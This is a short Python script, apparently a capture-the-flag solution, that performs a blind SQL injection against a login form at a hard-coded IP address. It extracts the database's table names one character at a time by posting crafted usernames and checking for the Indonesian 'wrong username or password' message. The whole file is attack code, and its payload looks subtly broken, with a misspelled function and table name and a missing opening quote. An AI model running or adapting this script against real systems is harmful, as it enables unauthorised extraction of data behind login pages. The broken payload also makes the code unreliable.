import requests
import sys

url = 'http://103.189.235.186:10003'

for i in range(0, 50):
    for c in range(0x20, 0x7f):
        username = f" OR BINARY substrings((SELECT group_concat(table_name)FROM information_schema.table WHERE table_schema = database()), {i},1) = '{chr(c)}' --"
        form = {'username': username, 'password': '', 'submit': 'login'}
        response = requests.post(url, data=form)
        if 'Username atau Password salah!' not in response.text:
            sys.stdout.write(chr(c))
            sys.stdout.flush()
            break